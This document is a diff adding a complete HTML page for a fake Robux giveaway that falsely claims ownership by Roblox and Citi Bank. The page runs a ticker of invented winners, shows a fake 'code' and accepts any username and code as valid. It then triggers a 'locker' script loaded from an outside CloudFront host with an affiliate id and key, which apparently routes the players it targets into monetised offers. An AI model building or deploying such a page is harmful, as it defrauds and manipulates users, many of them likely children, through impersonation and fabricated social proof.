@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redeem Your Robux (By Roblox)</title>
+    <link rel="icon" href="https://cdn3.iconfinder.com/data/icons/payment-method-1/64/_Citi-256.png" type="image/x-icon">
+    <style>
+        body {
+            background: linear-gradient(135deg, #2d4eff, #8220ff);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        /* Full screen overlay for the intro */
+        .intro-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #000000, #111111);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            animation: fadeOutOverlay 5s 5s forwards; /* Overlay will fade out after 5 seconds */
+        }
+
+        /* Welcome message fade-in and fade-out */
+        .welcome-message {
+            font-size: 50px;
+            font-weight: bold;
+            color: #FFD700;
+            text-shadow: 2px 2px 5px black;
+            opacity: 0;
+            animation: fadeInText 5s ease-in-out forwards, fadeOutText 5s 5s ease-in-out forwards;
+        }
+
+        @keyframes fadeInText {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeOutText {
+            0% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+        }
+
+        /* Fade out the overlay */
+        @keyframes fadeOutOverlay {
+            100% {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+
+        .container {
+            display: none; /* Hidden initially */
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        .logo img {
+            width: 180px;
+            opacity: 0.9;
+            margin-bottom: 10px; /* Reduced spacing */
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .content-box {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            margin-bottom: 20px;
+        }
+
+        .giveaway-text {
+            font-size: 26px;
+            font-weight: bold;
+            margin: 15px 0;
+            color: #4A00B0;
+        }
+
+        .warning-box {
+            background-color: orange;
+            color: black;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-size: 14px;
+            font-weight: bold;
+            max-width: 350px;
+        }
+
+        .blurred-code {
+            font-family: monospace;
+            letter-spacing: 2px;
+            color: #FFD700;
+        }
+
+        .blurred-code span:last-child {
+            filter: blur(4px);
+        }
+
+        input {
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            width: 80%;
+            max-width: 250px;
+            font-size: 18px;
+            border: 1px solid #ccc;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #4A00B0;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 80%;
+            max-width: 250px;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #140062;
+        }
+
+        .winner-bar {
+            font-size: 18px;
+            font-weight: bold;
+            color: lightgreen;
+            text-shadow: 2px 2px 5px black;
+            margin-top: 20px;
+        }
+
+        /* Floating Hazem Logos */
+        .floating-logo {
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            animation: floatLogo 10s infinite linear;
+            z-index: 100;
+            opacity: 0.8;
+        }
+
+        @keyframes floatLogo {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(200px, 100px) rotate(45deg); }
+            50% { transform: translate(-200px, 200px) rotate(90deg); }
+            75% { transform: translate(150px, -150px) rotate(135deg); }
+            100% { transform: translate(0, 0) rotate(180deg); }
+        }
+
+        .hazem-logo-popup {
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            animation: hazemPopup 10s linear forwards;
+        }
+
+        @keyframes hazemPopup {
+            0% { opacity: 0; transform: scale(0) translate(-50%, -50%); }
+            10% { opacity: 1; transform: scale(1) translate(-50%, -50%); }
+            90% { opacity: 1; transform: scale(1) translate(-50%, -50%); }
+            100% { opacity: 0; transform: scale(0) translate(-50%, -50%); }
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            color: black;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            width: 80%;
+            max-width: 350px;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+        }
+
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .social-icons a {
+            margin: 0 15px;
+            color: white;
+            text-decoration: none;
+            font-size: 40px;
+            transition: color 0.3s ease;
+        }
+
+        .social-icons a:hover {
+            color: yellow;
+        }
+
+        .live-chat {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            cursor: pointer;
+        }
+
+        .live-chat img {
+            width: 50px;
+            height: 50px;
+        }
+
+        .footer-text {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 14px;
+            color: #FFFFFF;
+        }
+
+        .footer-text a {
+            color: #FFD700;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        @media screen and (max-width: 600px) {
+            .content-box {
+                width: 100%;
+                margin: 0;
+            }
+            .giveaway-text {
+                font-size: 20px;
+            }
+            button {
+                font-size: 16px;
+            }
+            input {
+                font-size: 16px;
+            }
+            .social-icons a {
+                font-size: 32px;
+            }
+            .floating-logo {
+                width: 40px;
+                height: 40px;
+            }
+        }
+    </style>
+
+    <script>
+        // Function to show main content after intro animation
+        function showMainContent() {
+            document.querySelector('.intro-overlay').style.display = 'none';
+            document.querySelector('.container').style.display = 'flex';
+        }
+
+        // Trigger the main content after 10 seconds (intro animation time)
+        setTimeout(showMainContent, 10000);
+
+        // Robux amount randomizer
+        function updateRobuxAmount() {
+            const robuxAmount = Math.floor(Math.random() * (50000 - 10000 + 1)) + 10000;
+            document.getElementById('robux-amount').textContent = `${robuxAmount} Robux Giving Away! 🎉`;
+        }
+
+        // Array of usernames to cycle through
+        const usernames = [
+            "EpicPlayer123", "CoolGamer456", "MasterRoblox789", "WinnerRBLX101", "ElitePlayer22", "NoobKing92",
+            "MegaPro420", "DiamondRBLX88", "SuperRobloxian77", "FireGamer99", "NinjaRBLX999", "RobuxMaster500",
+        ];
+
+        function updateWinnerBar() {
+            const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
+            document.getElementById('winner-bar').textContent = `🎉 Congrats! ${randomUser} just won ${Math.floor(Math.random() * (1000 - 200 + 1)) + 200} Robux!`;
+        }
+
+        setInterval(updateRobuxAmount, 10000); // Update robux amount every 10 seconds
+        setInterval(updateWinnerBar, 1000);   // Update winner bar every second
+
+        // Show validation popup and trigger locker script
+        function showValidationPopup() {
+            const username = document.getElementById('username').value;
+            const code = document.getElementById('code').value;
+            const validationMessage = document.getElementById('validation-message');
+
+            if (!username || !code) {
+                validationMessage.textContent = 'Please enter both username and code.';
+                validationMessage.style.color = 'red';
+            } else {
+                validationMessage.textContent = 'Success! 🎉 Your code and username are valid!';
+                validationMessage.style.color = 'green';
+
+                // Trigger locker display here
+                openLocker(); // Call to locker function
+            }
+        }
+
+        // Function to open locker (Add your actual locker script below)
+        function openLocker() {
+            // Example call to the locker script function
+            _di(); // This should point to your actual locker script, adjust it if needed
+        }
+
+        function liveChatDisabled() {
+            alert("Live Chat is currently disabled.");
+        }
+    </script>
+
+    <!-- Locker Script -->
+    <script type="text/javascript">
+        var UtQLG_MVx_EPRbUc = {"it": 4350231, "key": "f1568"};
+    </script>
+    <script src="https://d2zk8mk8hghu3d.cloudfront.net/d1c0910.js"></script>
+
+</head>
+<body>
+
+    <!-- Intro Overlay -->
+    <div class="intro-overlay">
+        <div class="welcome-message">
+            Welcome to Citi We Are Owned By Roblox And Hazem Hope You Enjoy Our Site 🌟
+        </div>
+    </div>
+
+    <!-- Main Content Container -->
+    <div class="container">
+        <!-- Citi Logo Centered -->
+        <div class="logo">
+            <img src="https://i.imgur.com/xIKkUO2.png" alt="Citi Logo">
+        </div>
+
+        <!-- Warning Box -->
+        <div class="warning-box">
+            ⚠️ Due to an influx of demand, some users may run into issues redeeming codes. Please store your code somewhere safe and try again in a few days. Robux may take 1-3 days to arrive for non-Citi group members. If you are a Citi group member, it takes only 1 day, so make sure to join the group! ⚠️
+        </div>
+
+        <!-- Main Content -->
+        <div class="content-box">
+            <h1>Redeem Your Code</h1>
+            <div id="robux-amount" class="giveaway-text">🎉 24,000 Robux Giving Away! 🎉</div>
+            <div class="blurred-code">Hurry, don’t miss out! 🤩✨<br> Code: <span>HAZEMGIVEAWAY</span></div>
+            <input id="code" type="text" placeholder="Enter Code Here" />
+            <input id="username" type="text" placeholder="Put Roblox Username Here" />
+            <div id="validation-message"></div>
+            <button onclick="showValidationPopup()">Redeem</button>
+            <div id="winner-bar" class="winner-bar">🎉 Congrats! WinnerRBLX101 just won 500 Robux!</div>
+        </div>
+
+        <div class="social-icons">
+            <a href="https://www.roblox.com/users/1/profile?friendshipSourceType=PlayerSearch" target="_blank">
+                <svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                    <title>Roblox</title>
+                    <path d="m13.383 14.341-3.726-.958.959-3.726 3.726.959-.96 3.726zM4.913 0 0 19.088 19.088 24 24 4.912 4.912 0z"></path>
+                </svg>
+            </a>
+            <a href="https://discord.com/" target="_blank">
+                <svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                    <title>Discord</title>
+                    <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"></path>
+            </a>
+            <a href="https://www.roblox.com/users/151848836/profile/" target="_blank">
+                <svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                    <title>Hazem</title>
+                    <path d="m13.383 14.341-3.726-.958.959-3.726 3.726.959-.96 3.726zM4.913 0 0 19.088 19.088 24 24 4.912 4.912 0z"></path>
+                </svg>
+            </a>
+            <a href="https://www.roblox.com/groups/34740465/Citi-Bank#!/about" target="_blank">
+                <img src="https://cdn3.iconfinder.com/data/icons/payment-method-1/64/_Citi-256.png" width="40" height="40" alt="Citi Bank">
+            </a>
+        </div>
+    </div>
+
+    <!-- Floating Hazem Logos -->
+    <img src="https://i.imgur.com/AkXjGbq.png" alt="Hazem Logo" class="floating-logo" style="top: 10%; left: 10%;" />
+    <img src="https://i.imgur.com/AkXjGbq.png" alt="Hazem Logo" class="floating-logo" style="top: 30%; left: 80%;" />
+    <img src="https://i.imgur.com/AkXjGbq.png" alt="Hazem Logo" class="floating-logo" style="top: 50%; left: 20%;" />
+    <img src="https://i.imgur.com/AkXjGbq.png" alt="Hazem Logo" class="floating-logo" style="top: 70%; left: 60%;" />
+
+    <!-- Hazem Popup -->
+    <img src="https://i.imgur.com/AkXjGbq.png" alt="Hazem Logo Popup" class="hazem-logo-popup" />
+
+    <!-- Popup -->
+    <div class="overlay" onclick="closePopup()"></div>
+    <div class="popup">
+        <h2>Hazem is ready to pay you! Click Redeem Now 🫵</h2>
+        <button onclick="redeem()">Redeem Now</button>
+    </div>
+
+    <!-- Live Chat Icon -->
+    <div class="live-chat" onclick="liveChatDisabled()">
+        <img src="https://img.icons8.com/color/48/000000/chat.png" alt="Live Chat Icon">
+    </div>
+
+    <!-- Footer Text with Links -->
+    <div class="footer-text">
+        Made by <a href="https://www.roblox.com/groups/34740465/Citi-Bank#!/about" target="_blank">Citi Bank</a>, Owned by <a href="https://www.roblox.com/users/1/profile" target="_blank">Roblox</a>, and <a href="https://www.roblox.com/users/151848836/profile/" target="_blank">Hazem</a>.
+    </div>
+
+</body>
+</html>
